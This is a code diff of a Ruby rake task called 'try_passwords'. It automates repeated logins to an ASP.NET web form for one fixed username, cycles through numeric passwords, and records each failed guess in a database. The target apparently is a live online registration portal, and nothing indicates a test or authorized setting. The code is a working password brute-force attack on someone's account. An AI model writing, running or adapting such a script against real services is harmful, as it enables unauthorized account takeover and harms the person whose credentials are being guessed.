@@ -5,9 +5,9 @@ task try_passwords: :environment do
 			@z = page
 		end
 		form = @z.form_with(:id => 'aspnetForm')
-		form['ctl00$ContentPlaceHolder1$UserName'] = "14102222"
-		form['ctl00$ContentPlaceHolder1$Password'] = i.to_s
-		response = a.submit(form, form.buttons.first)
+		form['ctl00$ContentPlaceHolder1$UserName'] = 14102222
+		form['ctl00$ContentPlaceHolder1$Password'] = i
+		response = form.submit
 		if response.body.include?("How To use New Online Registration Video")
 			puts "Failed for #{i}"
 			Trial.create(password:i)
